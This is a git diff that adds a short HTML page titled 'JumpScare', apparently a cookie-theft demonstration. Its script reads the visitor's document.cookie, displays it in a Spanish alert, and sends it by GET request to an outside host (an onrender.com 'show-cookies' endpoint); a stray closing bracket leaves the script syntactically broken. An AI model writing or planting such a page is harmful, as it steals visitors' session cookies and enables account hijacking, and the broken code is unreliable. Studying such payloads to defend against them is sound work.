@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JumpScare</title>
+</head>
+<body>
+    <script>
+
+        const cookies = document.cookie;
+        alert("Cookies obtenidas: " + cookies);
+
+
+        fetch(`https://testnode-knt5.onrender.com/show-cookies?cookies=${cookies}`, { 
+            method: 'GET',  
+        })
+        })
+    </script>
+</body>
+</html>
